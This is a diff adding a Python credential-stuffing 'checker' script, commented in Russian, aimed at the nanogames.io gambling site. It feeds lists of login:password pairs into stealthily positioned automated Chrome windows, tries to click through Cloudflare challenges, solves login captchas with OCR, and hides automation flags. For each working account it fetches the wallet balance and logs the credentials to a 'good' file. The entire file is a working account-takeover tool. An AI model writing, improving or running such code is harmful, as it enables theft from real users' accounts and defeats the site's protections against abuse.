@@ -1,0 +1,245 @@
+import os
+import re
+import io
+import time
+import shutil
+import random
+import threading
+import queue
+import sys
+import json
+from PIL import Image, ImageEnhance
+import ddddocr
+from DrissionPage import ChromiumPage, ChromiumOptions
+from DrissionPage.common import Keys
+from colorama import Fore, Style, init
+
+# --- ИНИЦИАЛИЗАЦИЯ ---
+init(autoreset=True)
+ocr = ddddocr.DdddOcr(show_ad=False)
+file_lock = threading.Lock()
+account_queue = queue.Queue()
+stop_event = threading.Event()
+
+def log(message, color=Fore.WHITE):
+    print(f"{color}{message}{Style.RESET_ALL}")
+
+def save_to_file(filename, data):
+    with file_lock:
+        with open(filename, 'a', encoding='utf-8') as f:
+            f.write(f"{data}\n")
+
+def preprocess_captcha(img_bytes):
+    try:
+        img = Image.open(io.BytesIO(img_bytes))
+        img = img.convert('L')
+        img = img.resize((img.width * 2, img.height * 2), Image.Resampling.LANCZOS)
+        enhancer = ImageEnhance.Contrast(img)
+        img = enhancer.enhance(2.0)
+        byte_io = io.BytesIO()
+        img.save(byte_io, format='PNG')
+        return byte_io.getvalue()
+    except: return img_bytes
+
+def is_cloudflare_present(page):
+    if "Выполнение проверки безопасности" in page.html or "Verify you are human" in page.html:
+        return True
+    if page.ele('tag:iframe@src*=/cdn-cgi/challenge-platform/', timeout=1):
+        return True
+    return False
+
+# --- ОСНОВНОЙ ДВИЖОК (ЛОГИКА 7.4) ---
+
+def check_account_logic(account_str, global_retries, local_attempt):
+    login, password = account_str.split(':', 1)
+    # Уникальная папка для каждого чека (как в 7.4)
+    user_data_dir = os.path.abspath(os.path.join('profiles_bg', f"prof_{random.randint(100000,999999)}"))
+    
+    co = ChromiumOptions()
+    co.set_browser_path(r'C:\Program Files\Google\Chrome\Application\chrome.exe')
+    
+    # --- НАСТРОЙКИ "НЕВИДИМКИ" НА ОСНОВНОМ ЭКРАНЕ ---
+    # Сдвигаем в правый нижний угол 4K монитора (3840x2160)
+    # Окно будет висеть там, но не будет мешать
+    co.set_argument('--window-position=3200,1300') 
+    co.set_argument('--window-size=600,800')
+    co.set_argument('--no-activate') # НЕ забирать фокус у пользователя
+    
+    # Флаги Win 11 против заморозки
+    co.set_argument('--disable-features=CalculateNativeWinOcclusion')
+    co.set_argument('--disable-backgrounding-occluded-windows')
+    # -----------------------------------------------
+    
+    co.set_argument('--no-sandbox')
+    co.set_argument('--disable-gpu')
+    co.set_argument('--disable-blink-features=AutomationControlled')
+    co.set_user_data_path(user_data_dir)
+    co.auto_port() # Библиотека сама найдет свободный порт
+
+    page = None
+    status = "STUCK"
+    
+    try:
+        log(f"[*] [{login}] Запуск в углу экрана...", Fore.CYAN)
+        page = ChromiumPage(co)
+        page.set.timeouts(3)
+        page.get('https://nanogames.io/login')
+        
+        login_clicked = False
+        login_attempts = 0
+
+        for attempt in range(45):
+            if stop_event.is_set(): break
+            
+            if "/regist" in page.url.lower() or "/signup" in page.url.lower():
+                status = "RETRY_NOW"; break
+
+            time.sleep(2)
+            page_content = page.html
+
+            # 1. БЭД
+            if any(t in page_content for t in ["Неверно указан", "4001", "адрес электронной почты"]):
+                log(f"[-] БЭД: {login}", Fore.RED)
+                save_to_file('processed.txt', account_str)
+                status = "DONE"; break
+
+            # 2. 2FA
+            if "SECURITY-2FA" in page_content:
+                log(f"[-] 2FA (BAD): {login}", Fore.RED)
+                save_to_file('processed.txt', account_str)
+                status = "DONE"; break
+
+            # 3. ГУД + БАЛАНС
+            wallet = page.ele('text=Wallet', timeout=0.5) or page.ele('text=Deposit', timeout=0.5)
+            if wallet and wallet.states.is_displayed:
+                log(f"[$] [{login}] Сбор баланса...", Fore.YELLOW)
+                time.sleep(2)
+                balance_result = "No Assets"
+                try:
+                    js = "return fetch('/api/user/amount/', {headers: {'auto': 'true'}}).then(res => res.json())"
+                    data = page.run_js(js)
+                    if data and 'data' in data:
+                        found = [f"{i['currencyName']}: {i['amount']}" for i in data['data'] if float(i.get('amount', 0)) > 0]
+                        if found: balance_result = " | ".join(found)
+                except: balance_result = "Parse Error"
+
+                log(f"[+++] ГУД: {login} [{balance_result}]", Fore.GREEN)
+                save_to_file('nano_good.txt', f"{login}:{password} | {balance_result}")
+                save_to_file('processed.txt', account_str)
+                status = "DONE"; break
+
+            # 4. CLOUDFLARE
+            if is_cloudflare_present(page):
+                # Кликаем в угол нашего маленького окна для фокуса
+                page.actions.click((10, 10))
+                page.actions.key_down(Keys.TAB).key_up(Keys.TAB)
+                page.actions.key_down(Keys.SPACE).key_up(Keys.SPACE)
+                time.sleep(8); continue
+
+            # 5. КАПЧА
+            captcha_input = page.ele('@placeholder=Verification Code', timeout=0.5)
+            if captcha_input and captcha_input.states.is_displayed:
+                captcha_img = page.ele('tag:img@@src*=/captcha', timeout=0.5) or \
+                              page.ele('tag:img@@src*=/api/user/captcha/', timeout=0.5) or \
+                              captcha_input.parent().ele('tag:img')
+                if captcha_img and captcha_img.states.is_displayed:
+                    raw_bytes = captcha_img.get_screenshot(as_bytes=True)
+                    if raw_bytes:
+                        res = "".join(re.findall(r'[A-Za-z0-9]', ocr.classification(preprocess_captcha(raw_bytes))))
+                        if len(res) == 4:
+                            log(f"[*] OCR: {res}", Fore.MAGENTA)
+                            captcha_input.input(res, clear=True)
+                            login_btn = page.ele('xpath://*[@id="login"]/div[2]/button[1]')
+                            if login_btn: login_btn.click(); login_attempts += 1
+                        else:
+                            captcha_img.click(); time.sleep(2)
+                continue
+
+            # 6. ВВОД ДАННЫХ
+            email_input = page.ele('@type=text', timeout=0.5)
+            if email_input and email_input.states.is_displayed:
+                if not email_input.value:
+                    email_input.input(login)
+                    page.ele('@type=password').input(password)
+                if not login_clicked and not captcha_input:
+                    login_btn = page.ele('xpath://*[@id="login"]/div[2]/button[1]')
+                    if login_btn:
+                        login_btn.click(); login_clicked = True; login_attempts += 1; time.sleep(2)
+            else:
+                page.actions.click((10, 10))
+                page.actions.key_down(Keys.ESCAPE).key_up(Keys.ESCAPE)
+
+            if login_attempts >= 6: status = "RETRY_LATER"; break
+
+    except Exception as e:
+        log(f"[!] Ошибка [{login}]: {e}", Fore.LIGHTRED_EX)
+        status = "RETRY_LATER"
+    finally:
+        if page:
+            try: page.quit()
+            except: pass
+        try: shutil.rmtree(user_data_dir, ignore_errors=True)
+        except: pass
+        return status
+
+def worker():
+    while not stop_event.is_set():
+        try:
+            account_data = account_queue.get(timeout=1)
+            account_str, global_retries = account_data
+        except queue.Empty: break
+
+        local_attempt = 0
+        final_status = "STUCK"
+        while local_attempt < 3:
+            final_status = check_account_logic(account_str, global_retries, local_attempt)
+            if final_status == "DONE": break
+            if final_status == "RETRY_NOW":
+                local_attempt += 1; continue
+            break
+
+        if final_status == "DONE":
+            account_queue.task_done()
+        else:
+            if global_retries < 2:
+                account_queue.put((account_str, global_retries + 1))
+            else:
+                save_to_file('nano_skipped.txt', account_str)
+                save_to_file('processed.txt', account_str)
+            account_queue.task_done()
+
+def main():
+    log("=== NANOGAMES CHECKER v. 9.6 (PC Background Stable) ===", Fore.CYAN)
+    threads_count = int(input("[?] Потоков (рекомендую 4): "))
+    raw_path = input("[?] Файл с аккаунтами: ")
+    file_path = raw_path.strip().replace('"', '').replace("'", "")
+    
+    with open(file_path, 'r', encoding='utf-8') as f:
+        all_accs = [line.strip() for line in f if line.strip() and ':' in line]
+
+    checked = set()
+    if os.path.exists('processed.txt'):
+        with open('processed.txt', 'r', encoding='utf-8') as f:
+            checked = set(line.strip() for line in f if line.strip())
+        if checked:
+            if input(f"[*] Найдено {len(checked)} проверенных. Продолжить? (y/n): ").lower() != 'y':
+                open('processed.txt', 'w').close(); checked = set()
+
+    to_check = [a for a in all_accs if a not in checked]
+    for acc in to_check: account_queue.put((acc, 0))
+    if not os.path.exists('profiles_bg'): os.makedirs('profiles_bg')
+
+    threads = []
+    for _ in range(threads_count):
+        # Ступенчатый запуск потоков
+        time.sleep(5)
+        t = threading.Thread(target=worker); t.daemon = True; t.start(); threads.append(t)
+
+    try:
+        while any(t.is_alive() for t in threads): time.sleep(1)
+    except KeyboardInterrupt:
+        stop_event.set(); sys.exit()
+    log("\n[+] Работа завершена!", Fore.GREEN)
+
+if __name__ == "__main__":
+    main()
